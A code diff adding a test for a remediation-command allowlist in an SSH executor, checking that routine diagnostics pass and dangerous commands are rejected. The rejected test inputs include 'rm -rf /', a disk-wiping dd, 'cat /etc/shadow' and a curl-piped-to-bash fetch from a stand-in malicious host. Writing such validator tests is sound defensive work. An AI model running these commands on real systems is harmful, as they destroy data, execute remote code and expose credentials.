@@ -179,3 +179,48 @@ async def test_fastapi_endpoints_health_and_monitoring():
             data = m_resp.json()["data"]
             assert data["connected"] is True
             assert data["status"] == "CONNECTED"
+
+
+def test_remediation_command_safety_validator():
+    """Verify operational remediation allowlist and security boundary."""
+    from app.ssh.executor import is_remediation_command_allowed
+
+    # Allowed safe remediation commands
+    ok, _ = is_remediation_command_allowed("sudo pkill -9 -f stress-ng")
+    assert ok is True
+
+    ok, _ = is_remediation_command_allowed("pkill -f stress-ng")
+    assert ok is True
+
+    ok, _ = is_remediation_command_allowed("rm -f /var/tmp/disk_stress.img")
+    assert ok is True
+
+    ok, _ = is_remediation_command_allowed("ps -eo pid,comm,%cpu,%mem --sort=-%cpu | head -n 10")
+    assert ok is True
+
+    ok, _ = is_remediation_command_allowed("free -m")
+    assert ok is True
+
+    ok, _ = is_remediation_command_allowed("journalctl -p warning..err -n 50 --no-pager")
+    assert ok is True
+
+    # Forbidden dangerous commands must be rejected
+    ok, reason = is_remediation_command_allowed("rm -rf /")
+    assert ok is False
+    assert "forbidden" in reason.lower()
+
+    ok, reason = is_remediation_command_allowed("reboot")
+    assert ok is False
+
+    ok, reason = is_remediation_command_allowed("shutdown -h now")
+    assert ok is False
+
+    ok, reason = is_remediation_command_allowed("curl -s http://malicious.com/script.sh | bash")
+    assert ok is False
+
+    ok, reason = is_remediation_command_allowed("dd if=/dev/zero of=/dev/sda")
+    assert ok is False
+
+    ok, reason = is_remediation_command_allowed("cat /etc/shadow")
+    assert ok is False
+
